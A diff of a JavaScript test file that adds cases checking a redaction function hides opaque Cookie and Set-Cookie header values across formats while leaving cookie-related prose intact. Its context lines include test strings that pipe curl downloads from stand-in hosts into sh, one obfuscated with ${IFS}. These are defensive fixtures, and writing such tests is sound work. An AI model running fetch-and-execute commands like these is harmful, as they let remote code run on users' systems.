@@ -124,6 +124,25 @@ for (const [input, want] of [
   ['**token: abc12345** stays', '**token: [redacted]** stays'], ['{"h":"Coo' + 'kie: sid=1","next":"keep me","url":"https://h"}', '{"h":"Cookie: [redacted]","next":"keep me","url":"https://h"}'], ['(token=abc12345) and more', '(token=[redacted]) and more'],
   ['{"a":"Coo' + 'kie: x=1","b":"Coo' + 'kie: y=2"}', '{"a":"Cookie: [redacted]","b":"Cookie: [redacted]"}'], ['set-coo' + 'kie: sid=abc123; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/', 'set-cookie: [redacted]; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/'],
 ]) assert.strictEqual(redact(input, {}), want, `stop rule: ${input.slice(0, 40)}`);
+// A Cookie or Set-Cookie header whose value has no `=` (one opaque token) is hidden whole (spec 012 FR-168, issue #1159).
+{
+  const OPQ = 'Tq7' + 'Zk2Xp9Lm4Vb8Nc1Rd5Sf6Gh3Jw0';
+  for (const [input, want, why] of [
+    ['Coo' + 'kie: ' + OPQ, 'Cookie: [redacted]', 'opaque token'],
+    ['Set-Coo' + 'kie: ' + OPQ + '; Path=/; HttpOnly', 'Set-Cookie: [redacted]; Path=/; HttpOnly', 'Set-Cookie token with attributes'],
+    ['Coo' + 'kie: a=1; ' + OPQ, 'Cookie: [redacted]', 'pair then a bare token'],
+    ['Coo' + 'kie: ' + OPQ + '; a=1', 'Cookie: [redacted]; a=1', 'bare token then a short pair'],
+    ['coo' + 'kie: ' + OPQ, 'cookie: [redacted]', 'lower-case name'],
+    ['COO' + 'KIE: ' + OPQ + '\r\nHost: x', 'COOKIE: [redacted]\r\nHost: x', 'upper case, CRLF'],
+    ['curl -H \'Coo' + 'kie: ' + OPQ + '\' https://x.example', "curl -H 'Cookie: [redacted]' https://x.example", 'curl -H argument'],
+    ['{"h":"Coo' + 'kie: ' + OPQ + '","next":"keep"}', '{"h":"Cookie: [redacted]","next":"keep"}', 'inside a JSON string'],
+    ['{\\"h\\":\\"Coo' + 'kie: ' + OPQ + '\\"}', '{\\"h\\":\\"Cookie: [redacted]\\"}', 'JSON-escaped string'],
+    ['{"Coo' + 'kie": "' + OPQ + '"}', '{"Cookie": "[redacted]"}', 'JSON key form'],
+    ['Coo' + 'kie: sid=' + OPQ, 'Cookie: [redacted]', 'name=value still hidden'],
+  ]) assert.strictEqual(redact(input, {}), want, `bare cookie token: ${why}`);
+  for (const keep of ['cookie: my session bug', 'cookie: stores', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1'])
+    assert.strictEqual(redact(keep, {}), keep, `bare cookie token: prose stays: ${keep}`);
+}
 for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
   const m = maskSecretCommand(c);
   assert.ok(/evil/.test(m) && /\|\s*sh$|evil\.sh\|sh$/.test(m), `the command's shell stays visible in maskSecretCommand: ${c.slice(0, 30)} gave ${m}`);
